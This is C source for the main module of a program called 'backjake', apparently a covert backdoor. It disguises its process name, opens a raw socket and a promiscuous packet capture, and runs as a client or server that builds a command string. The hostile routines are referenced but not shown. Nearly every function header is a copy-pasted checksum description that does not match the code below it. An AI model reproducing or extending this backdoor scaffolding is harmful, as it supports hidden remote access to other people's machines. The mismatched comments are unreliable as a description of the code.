#include "backjake.h"

static volatile sig_atomic_t canjump;
pthread_mutex_t ThreadLock = PTHREAD_MUTEX_INITIALIZER;

/*------------------------------------------------------------------------------
--
--  FUNCTION:   main
--
--  DATE:       October 5, 2014
--
--  DESIGNERS:  Jacob Miner  
--
--  PROGRAMMER: Jacob Miner
--
--  INTERFACE:  in_cksum(unsigned short *ptr, int nbytes)
--                          ptr     - pointer to an unsigned short (packet, in this case)
--                          nbytes  - number of bytes
--
--  RETURNS:    unsigned short - the checksum of the packet
--
--  NOTES:      calculates the checksum
--  
------------------------------------------------------------------------------*/
int main(int argc, char** argv)
{
    running = 1;
    AddrInfo *Addr_Ptr;
    PcapInfo *pcap_ptr;
    pthread_t ThreadID2;

    disguise(argv);
    //checkArgs(argc, argv);
    //setConfig();
    
    initializeAddress(&Addr_Ptr);
    initializeDoor(Addr_Ptr);
    initializePcap(&pcap_ptr, Addr_Ptr);
    setPcap(pcap_ptr, Addr_Ptr);
    initializeSocket(Addr_Ptr);
    setupSignals();

    if (argc >= 2) 
    {
        server = 1;
        client((void*)Addr_Ptr, (void*)pcap_ptr, &ThreadID2);
    } else {
        server = 0;
        startServer((void*)Addr_Ptr, (void*)pcap_ptr, &ThreadID2);
    }

    //free (Addr_Ptr);
    //free (pcap_ptr);
    return 0;
}

/*------------------------------------------------------------------------------
--
--  FUNCTION:   in_cksum
--
--  DATE:       October 5, 2014
--
--  DESIGNERS:  Jacob Miner  
--
--  PROGRAMMER: Jacob Miner
--
--  INTERFACE:  in_cksum(unsigned short *ptr, int nbytes)
--                          ptr     - pointer to an unsigned short (packet, in this case)
--                          nbytes  - number of bytes
--
--  RETURNS:    unsigned short - the checksum of the packet
--
--  NOTES:      calculates the checksum
--  
------------------------------------------------------------------------------*/
void initializeSocket(AddrInfo *Addr_Ptr)
{
    int arg;
    Addr_Ptr->RawSocket = socket (PF_INET, SOCK_RAW, IPPROTO_TCP);
    
    arg = 1;
    if (setsockopt (Addr_Ptr->RawSocket, SOL_SOCKET, SO_REUSEADDR, &arg, sizeof(arg)) == -1) 
        perror("setsockopt");
}

/*------------------------------------------------------------------------------
--
--  FUNCTION:   in_cksum
--
--  DATE:       October 5, 2014
--
--  DESIGNERS:  Jacob Miner  
--
--  PROGRAMMER: Jacob Miner
--
--  INTERFACE:  in_cksum(unsigned short *ptr, int nbytes)
--                          ptr     - pointer to an unsigned short (packet, in this case)
--                          nbytes  - number of bytes
--
--  RETURNS:    unsigned short - the checksum of the packet
--
--  NOTES:      calculates the checksum
--  
------------------------------------------------------------------------------*/
void initializeAddress(AddrInfo **Addr_Ptr)
{
    if ((*Addr_Ptr = malloc (sizeof (AddrInfo))) == NULL)
    {
        perror ("malloc");
        exit (1);
    }
}

/*------------------------------------------------------------------------------
--
--  FUNCTION:   in_cksum
--
--  DATE:       October 5, 2014
--
--  DESIGNERS:  Jacob Miner  
--
--  PROGRAMMER: Jacob Miner
--
--  INTERFACE:  in_cksum(unsigned short *ptr, int nbytes)
--                          ptr     - pointer to an unsigned short (packet, in this case)
--                          nbytes  - number of bytes
--
--  RETURNS:    unsigned short - the checksum of the packet
--
--  NOTES:      calculates the checksum
--  
------------------------------------------------------------------------------*/
void initializePcap(PcapInfo **pcap_ptr, AddrInfo *Addr_Ptr)
{
    if ((*pcap_ptr = malloc (sizeof (PcapInfo))) == NULL)
    {
        perror ("malloc");
        exit (1);
    }
}

/*------------------------------------------------------------------------------
--
--  FUNCTION:   in_cksum
--
--  DATE:       October 5, 2014
--
--  DESIGNERS:  Jacob Miner  
--
--  PROGRAMMER: Jacob Miner
--
--  INTERFACE:  in_cksum(unsigned short *ptr, int nbytes)
--                          ptr     - pointer to an unsigned short (packet, in this case)
--                          nbytes  - number of bytes
--
--  RETURNS:    unsigned short - the checksum of the packet
--
--  NOTES:      calculates the checksum
--  
------------------------------------------------------------------------------*/
void setPcap(PcapInfo* pcap_ptr, AddrInfo *Addr_Ptr)
{
    char *nic_dev = "p2p1"; // CHANGE; 
    char errbuf[PCAP_ERRBUF_SIZE];
    bpf_u_int32 maskp;          // subnet mask    

    pcap_lookupnet (nic_dev, &pcap_ptr->netp, &maskp, errbuf);
    pcap_ptr->nic_descr = pcap_open_live (nic_dev, BUFSIZ, 1, -1, errbuf);
    
    if (pcap_ptr->nic_descr == NULL)
    { 
        printf("pcap_open_live(): %s\n",errbuf); 
        exit(1); 
    }

    //snprintf (pcap_ptr->cmd, sizeof(pcap_ptr->cmd), CMD, Addr_Ptr->DstHost, Addr_Ptr->dport);
    snprintf (pcap_ptr->cmd, sizeof(pcap_ptr->cmd), CMD);
    printf("%s\n", pcap_ptr->cmd);
}

/*------------------------------------------------------------------------------
--
--  FUNCTION:   in_cksum
--
--  DATE:       October 5, 2014
--
--  DESIGNERS:  Jacob Miner  
--
--  PROGRAMMER: Jacob Miner
--
--  INTERFACE:  in_cksum(unsigned short *ptr, int nbytes)
--                          ptr     - pointer to an unsigned short (packet, in this case)
--                          nbytes  - number of bytes
--
--  RETURNS:    unsigned short - the checksum of the packet
--
--  NOTES:      calculates the checksum
--  
------------------------------------------------------------------------------*/
void initializeDoor(AddrInfo *Addr_Ptr)
{
    unsigned int iseed = (unsigned int)time(NULL);    // use the current time as the random seed value
    // seed random number generator
    srand(iseed);

    // set defaults
    Addr_Ptr->SrcHost = GetIPAddress();    // Default Source IP
    Addr_Ptr->DstHost = NULL;           // Must be specified by user!
    Addr_Ptr->dport = DEFAULT_DST_PORT;     // Default Destination Port
    Addr_Ptr->sport = rand()% 40000 + 2000; // Default (Random) Source Port between 2000 and 60000
}

/*------------------------------------------------------------------------------
--
--  FUNCTION:   checkArgs(int argc, char **argv)
--
--  DATE:       October 5, 2014
--
--  DESIGNERS:  Jacob Miner  
--
--  PROGRAMMER: Jacob Miner
--
--  INTERFACE:  in_cksum(unsigned short *ptr, int nbytes)
--                          ptr     - pointer to an unsigned short (packet, in this case)
--                          nbytes  - number of bytes
--
--  RETURNS:    unsigned short - the checksum of the packet
--
--  NOTES:      calculates the checksum
--  
------------------------------------------------------------------------------*/
void checkArgs(int argc, char **argv)
{
    if (argc < 2)
    {
        usage(argv);
    }
}

/*------------------------------------------------------------------------------
--
--  FUNCTION:   setConfig()
--
--  DATE:       October 5, 2014
--
--  DESIGNERS:  Jacob Miner  
--
--  PROGRAMMER: Jacob Miner
--
--  INTERFACE:  setConfig()
--
--  RETURNS:    void
--
--  NOTES:      calculates the checksum
--  
------------------------------------------------------------------------------*/
void setConfig()
{
 //   char* options = "";
   // options = readConfigFile();
}